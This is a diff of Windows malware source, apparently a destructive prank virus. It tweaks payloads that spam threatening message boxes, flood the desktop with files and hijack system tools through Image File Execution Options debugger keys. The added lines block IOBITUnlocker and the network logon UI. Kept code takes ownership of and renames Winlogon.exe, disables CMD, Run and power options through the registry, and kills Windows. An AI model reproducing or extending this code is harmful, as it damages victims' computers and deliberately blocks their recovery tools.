@@ -315,17 +315,11 @@ BOOL CALLBACK EnumWindowProc2(HWND hwnd, LPARAM lParam) {
     return TRUE;
 }
 
-int ChangeText(int times, int runtime) {
+int payloadChangeText(int times, int runtime) {
     EnumWindows(&EnumWindowProc2, NULL);
     return 50;
 }
 
-int payloadChangeText(int times, int runtime) {
-    while (1) {
-        CreateThread(NULL, NULL, &payloadThread, &ChangeText, NULL, NULL);
-        Sleep(1000);
-    }
-}
 
 
 /* create desktop files */
@@ -338,18 +332,11 @@ void CreateDesktopFiles() {
         0,
         szPath)))
     {
-        for (int i = 0; i < 500; ++i) {
+        for (int i = 0; i < 300; ++i) {
             SHGetFolderPath(NULL, CSIDL_DESKTOP | CSIDL_FLAG_CREATE, NULL, 0, szPath);
             PathAppend(szPath, L"a" + rand() % 3000);
             CreateFileW(szPath, GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
         }
-    }
-    /* old way, impossible to get it */
-    for (int i = 0; i < 150; ++i) {
-        break;
-        CreateFileW((L"C:\\Users\\Public\\Desktop\\\u0666\u0666" + rand() % (3000)), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-        CreateFileW((L"C:\\Users\\Public\\Desktop\\\u0066\u0066" + rand() % (3000)), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
-        CreateFileW((L"C:\\Users\\Public\\Desktop\\\u0006\u0006" + rand() % (3000)), GENERIC_READ | GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, 0);
     }
 }
 
@@ -391,7 +378,7 @@ DWORD WINAPI messageBoxThread(LPVOID parameter) {
         Sleep(3000);
         MessageBoxW(NULL, L"u need to die", L"ahahahahaah", MB_OK | MB_ICONQUESTION);
         Sleep(1500);
-        MessageBoxW(NULL, L"(╯°□°)╯︵ ┻━┻ ", L"i will kill everyone", MB_OK | MB_ICONINFORMATION);
+        MessageBoxW(NULL, L"run away", L"run away", MB_OK | MB_ICONINFORMATION);
         Sleep(1500);
         MessageBoxW(NULL, L"lol haha xd", L"lol", MB_OK | MB_ICONERROR);
         Sleep(2000);
@@ -400,8 +387,6 @@ DWORD WINAPI messageBoxThread(LPVOID parameter) {
         MessageBoxW(NULL, L"Call your technical support hehe", L"\n", MB_OK | MB_ICONERROR);
         Sleep(1500);
         MessageBoxW(NULL, L"don't press ok", L"ur crazy!!!!", MB_OK | MB_ICONINFORMATION);
-        Sleep(1500);
-        MessageBoxW(NULL, L"><(((*>", L"система", MB_OK | MB_ICONWARNING);
         Sleep(1500);
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
         MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
@@ -429,25 +414,17 @@ DWORD WINAPI messageBox1Thread(LPVOID parameter) {
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
         MessageBoxW(NULL, L"uR crazy bro u cannot run the unwanted virus", L"0_o", MB_OK | MB_ICONERROR);
         Sleep(1500);
-        MessageBoxW(NULL, L"Did you knöw that this malΣ╕are is des©ribing everything is happening tδ you bro?", L"(1) New mes░age from GLaDΣ╕§: 6/6/5╕666 3:∞▒░òá Σ╕", MB_OK | MB_ICONINFORMATION);
-        Sleep(1500);
-        MessageBoxW(NULL, L"No te parece eso curioso?", L"blue sky up/dw thn sun", MB_OK | MB_ICONQUESTION);
-        Sleep(1500);
         MessageBoxW(NULL, L"null is Null or Inexistent", L"True or false?", MB_OK | MB_ICONINFORMATION);
         Sleep(1500);
         MessageBoxW(NULL, L"The application was unable to start correctly (0xc000029A) Click OK to close the application", L"unwanted.exe - Application Error", MB_OK | MB_ICONERROR);
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
-        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
         MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
         Sleep(1500);
         MessageBoxW(NULL, L"my pc is doing strange things plzz helppp", L"®abcdefg®dcededed", MB_OK | MB_ICONWARNING);
         Sleep(1500);
         MessageBoxW(NULL, L"You got the feeling, I know you are there", L"I am alone ;-;", MB_OK | MB_ICONWARNING);
         Sleep(1500);
-        CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
         CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
-        MessageBoxW(NULL, L"WHADUEF4HEUFWHFGUERHG4UTYH834T239Y13", L"(1) New mes░age from £Ω▒░ φòá : 6/6/5╕666 3:∞▒░òá Σ╕", MB_OK | MB_ICONINFORMATION);
-        Sleep(1500);
     }
 }
 
@@ -471,7 +448,6 @@ DWORD WINAPI messageBox2Thread(LPVOID parameter) {
         MessageBoxW(NULL, L"game shift to shut\n alt & ctrl to move", L"space invaders", MB_OK | MB_ICONINFORMATION);
         Sleep(1500);
         CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
-        CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
         CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
     }
     return 0;
@@ -485,19 +461,8 @@ DWORD WINAPI urnidiotmsgbx(LPVOID parameter) {
         CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
         MessageBoxW(NULL, L"\n", L"\n", MB_OK | MB_ICONERROR);
         Sleep(100);
-        CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
         MessageBoxW(NULL, L"Ready to reinstall Windows?", L"®³€³¤³¤³€üþí¤íéé²é", MB_OK | MB_ICONWARNING);
         Sleep(1500);
-        MessageBoxW(NULL, L"Oh no! Two Minutes! AHHHHHHHHH", L"helpz zplzzzzz", MB_OK | MB_ICONWARNING);
-        Sleep(1500);
-        MessageBoxW(NULL, L"Did you knöw that this malΣ╕are is des©ribing everything is happening tδ you bro?", L"(1) New mes░age from GLaDΣ╕§: 6/6/5╕666 3:∞▒░òá Σ╕", MB_OK | MB_ICONINFORMATION);
-        Sleep(1500);
-        MessageBoxW(NULL, L"No te parece eso curioso?", L"blue sky up/dw thn sun", MB_OK | MB_ICONQUESTION);
-        Sleep(1500);
-        MessageBoxW(NULL, L"please don't scream me at night :(", L"(1) New mes░age from ùáΣ╕Çτ : 6/6/5╕666 3:∞▒░òá Σ╕", MB_OK | MB_ICONINFORMATION);
-        Sleep(1500);
-        CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
-        MessageBoxW(NULL, L"my pc is doing strange things plzz helppp", L"®abcdefg®dcededed", MB_OK | MB_ICONWARNING);
         Sleep(1500);
         MessageBoxW(NULL, L"You got the feeling, I know you are there", L"I am alone ;-;", MB_OK | MB_ICONWARNING);
         Sleep(1500);
@@ -506,35 +471,17 @@ DWORD WINAPI urnidiotmsgbx(LPVOID parameter) {
     return 0;
 }
 
-/* 5st message box thread */
-DWORD WINAPI othermsgbx(LPVOID parameter) {
-    HHOOK hook = SetWindowsHookEx(WH_CBT, msgBoxHook, 0, GetCurrentThreadId());
-    while (1) {
-        MessageBoxW(NULL, L" α╢öα╢╢α╢º α╢╕α╖Öα╢║ α╢ëα╖Çα╢¡α╖è α╢Üα╖à α╢▒α╖£α╖äα╖Éα╢Ü" + rand() % 10, L" µ░╕µùáΣ╕Çτöƒ ", MB_OK | MB_ICONQUESTION);
-        MessageBoxW(NULL, L" ∞¥┤Ω▓â∞¥ä ∞á£Ω▒░ φòá ∞êÿ ∞ùå∞è╡δïêδïñ. " + rand(), L"\n", MB_OK | MB_ICONERROR);
-        Sleep(1500);
-        MessageBoxW(NULL, L" ╘┤╒╕╓é╓ä ╒╣╒Ñ╓ä ╒»╒í╓Ç╒╕╒▓ ╒╜╒í ╒░╒í╒╢╒Ñ╒¼ " + rand(), L" ∞¥┤Ω▓á ∞êÿ ∞ù ", MB_OK | MB_ICONERROR);
-        Sleep(1500);
-        MessageBoxW(NULL, L" ∞δïêδ¥┤£Ω▒░ φòá ∞è╡ïñ. " + rand() % 10, L"╘┤╒╕╓é╜╒í ╒░╒í╒╢╒Ñ╒¼ deδïêδded" + rand() % 5, MB_OK | MB_ICONINFORMATION);
-        Sleep(1500);
-        MessageBoxW(NULL, L" ùáΣ╕Çτµ░ùáΣ╕Çτ╕ùáΣ╕ÇτµöƒùáΣ╕Çτ " + rand(), L" ░ φò▓â∞êÿ ∞ùå∞á ∞è╡δïê∞¥┤Ω¥ä ∞á£Ω▒δïñ. ", MB_OK | MB_ICONINFORMATION);
-        Sleep(1500);
-        CreateThread(NULL, 4096, &othermsgbx, NULL, NULL, NULL);
-    }
-    return 0;
-}
 
 /* message box payload */
 int payloadMessageBox(int times, int runtime) {
     CreateThread(NULL, 4096, &messageBoxThread, NULL, NULL, NULL);
-    Sleep(3000);
+    Sleep(5000);
     CreateThread(NULL, 4096, &messageBox1Thread, NULL, NULL, NULL);
-    Sleep(3000);
+    Sleep(5000);
     CreateThread(NULL, 4096, &messageBox2Thread, NULL, NULL, NULL);
-    Sleep(5500);
+    Sleep(9000);
     CreateThread(NULL, 4096, &urnidiotmsgbx, NULL, NULL, NULL);
-    Sleep(2000);
-    CreateThread(NULL, 4096, &othermsgbx, NULL, NULL, NULL);
+    Sleep(10000);
     return 0;
 }
 
@@ -660,7 +607,6 @@ void DisableSecurity() {
 /* 3:33:33 AM payload */
 void SetTimeDate() {
     CreateTimeDate();
-    ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\UxTheme.dll & icacls C:\\Windows\\SysNative\\UxTheme.dll /grant everyone:F & ren C:\\Windows\\SysNative\\UxTheme.dll main_lol.dll", NULL, SW_HIDE);
     if (PathFileExistsA("C:\\Windows\\SysNative")) {
         ShellExecuteA(NULL, NULL, "cmd", "/c takeown /f C:\\Windows\\SysNative\\Winlogon.exe & icacls C:\\Windows\\SysNative\\Winlogon.exe /grant everyone:F & ren C:\\Windows\\SysNative\\winlogon.exe deleteme.exe", NULL, SW_HIDE);
     }
@@ -697,6 +643,27 @@ void DisableRun() {
     RegCreateKeyEx(HKEY_CURRENT_USER, TEXT("Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle, NULL);
     RegSetValueEx(regHandle, TEXT("NoRun"), 0, REG_DWORD, data, sizeof(DWORD));
     RegCloseKey(regHandle);
+}
+
+int DisableCmdExist() {
+    HKEY hKey;
+    LONG nResult;
+    BOOL bExist = FALSE;
+    if (RegOpenKeyEx(HKEY_CURRENT_USER, L"Software\\Policies\\Microsoft\\Windows\\System", 0, KEY_READ | KEY_WOW64_64KEY, &hKey) == ERROR_SUCCESS)
+    {
+        DWORD dwType;
+        nResult = RegQueryValueEx(hKey, L"DisableCMD", NULL, &dwType, NULL, NULL);
+        if (nResult == ERROR_SUCCESS)
+            bExist = TRUE;
+        RegCloseKey(hKey);
+
+        if (bExist == TRUE) {
+            return TRUE;
+        }
+        else {
+            return FALSE;
+        }
+    }
 }
 
 void DisableCMD() {
@@ -747,7 +714,7 @@ void DisableDesktopBackground() {
     RegCloseKey(regHandle2);
 }
 
-void DisablePowerOptions() {
+void DisableLogonOptions() {
     HKEY regHandle; // Disable Power Options
     DWORD dwValue = 0;
     BYTE* data = (BYTE*)&dwValue;
@@ -755,6 +722,18 @@ void DisablePowerOptions() {
     RegSetValueEx(regHandle, TEXT("shutdownwithoutlogon"), 0, REG_DWORD, data, sizeof(DWORD));
     RegCloseKey(regHandle);
 
+
+    HKEY regHandle2; // Disable Network Logon UI
+    DWORD dwValue2 = 1;
+    BYTE* data2 = (BYTE*)&dwValue2;
+    RegCreateKeyEx(HKEY_LOCAL_MACHINE, TEXT("Software\\Policies\\Microsoft\\Windows\\System"), 0, NULL, NULL, KEY_WRITE | KEY_WOW64_32KEY, NULL, &regHandle2, NULL);
+    RegSetValueEx(regHandle2, TEXT("DontDisplayNetworkSelectionUI"), 0, REG_DWORD, data2, sizeof(DWORD));
+    RegCloseKey(regHandle2);
+
+}
+
+void DisablePowerOptions() {
+    
 
     HKEY regHandle3; // Disable Logon Ui background
     DWORD dwValue3 = 1;
@@ -781,6 +760,7 @@ void DisablePowerOptions() {
     ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\sfc.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
     ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\shutdown.exe\u0022 /v Debugger /d \u0022C:\\Program Files\\Common Files\\WINNT32.EXE\u0022", NULL, SW_HIDE);
 
+    ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\IOBITUnlocker.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title YOU ARE TRYING TO KILL ME HUH??? &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run IOBITUnlocker.exe &pause >nul&\u0022", NULL, SW_HIDE);
     ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\rstrui.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 0a & title System Restore &  echo Nice try &pause >nul&\u0022", NULL, SW_HIDE);
     ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\ProcessHacker.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c color 04 & title PROCESSHACKER.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run PROCESSHACKER.EXE &pause >nul&\u0022", NULL, SW_HIDE);
     ShellExecuteA(NULL, NULL, "REG", "ADD \u0022HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\Powershell.exe\u0022 /v Debugger /d \u0022C:\\Windows\\System32\\cmd.exe /c title POWERSHELL.EXE &  echo THERE IS NO ESCAPE, YOUR COMPUTER IS MINE & echo you cannot run POWERSHELL &pause >nul&\u0022", NULL, SW_HIDE);
@@ -890,10 +870,9 @@ DWORD WINAPI StartBeep(LPVOID parameter) {
 }
 
 int RandBeep() {
-    while (1) {
-        Beep(rand() * 20, 1000);
-        Sleep(100);
-    }
+    Beep(rand() * 20, 1000);
+    Sleep(100);
+    return 0;
 }
 
 void CreateKillWindows() {
@@ -1006,6 +985,8 @@ void TestInternetConnection() {
 
 }
 void NormalComputer() {
+    // Shown when this is not a normal computer
+    // This payload is shown when delete WINLOGON.EXE from system32
     MessageBox(
         NULL,
         (LPCWSTR)L"This is not a normal computer", // Warning message box
@@ -1016,12 +997,10 @@ void NormalComputer() {
 
 int PlayMusik() {
     if (PlaySoundA("C:\\Program Files\\Common Files\\system\\Panic.wav", NULL, SND_SYNC) == FALSE) { // If it does not find the file (returns False) if BSOD =)
-        CreateThread(NULL, NULL, &payloadThread, &NormalComputer, NULL, NULL);
-        CreateThread(NULL, NULL, &payloadThread, &NormalComputer, NULL, NULL);
-        CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
+        killWindowsInstant();
     }
     // plays music
-    CreateThread(NULL, NULL, &payloadThread, &killWindowsInstant, NULL, NULL);
+    killWindowsInstant();
     return 0;
 }
 
@@ -1043,7 +1022,6 @@ void PrankFolders() {
 
 void superPowerFulMainPayload() {
 
-    CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
     /* Main Payload */
     Sleep(1500);
     CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
@@ -1051,9 +1029,7 @@ void superPowerFulMainPayload() {
     ShellExecuteA(NULL, NULL, "wordpad", "\u0022C:\\Program Files\\Common Files\\system\\Documento.rtf\u0022", NULL, SW_SHOWDEFAULT);
     Sleep(8500);
     ShellExecuteA(NULL, NULL, "control", NULL, NULL, SW_SHOWDEFAULT);
-    Sleep(4500);
-    CreateThread(NULL, NULL, &payloadThread, &payloadMessageBox, NULL, NULL);
-    Sleep(4500);
+    Sleep(7900);
     ShellExecuteA(NULL, NULL, "regedit", NULL, NULL, SW_SHOWDEFAULT);
     Sleep(4500);
     ShellExecuteA(NULL, NULL, "notepad", "C:\\Program Files\\Common Files\\system\\Die.txt", NULL, SW_SHOW);
@@ -1064,7 +1040,7 @@ void superPowerFulMainPayload() {
     Sleep(2250);
     CreateThread(NULL, NULL, &payloadThread, &DestroyURScreen, NULL, NULL);
     ShellExecuteA(NULL, NULL, "mspaint", "\u0022C:\\Program Files\\Common Files\\system\\kitten.jpg\u0022", NULL, SW_SHOWDEFAULT);
-    Sleep(2250);
+    Sleep(3200);
     ShellExecuteA(NULL, NULL, "charmap", NULL, NULL, SW_SHOWDEFAULT);
     Sleep(6000);
     CreateThread(NULL, NULL, &payloadThread, &RandBeep, NULL, NULL);
@@ -1077,3 +1053,5 @@ void superPowerFulMainPayload() {
     }
 
 }
+
+
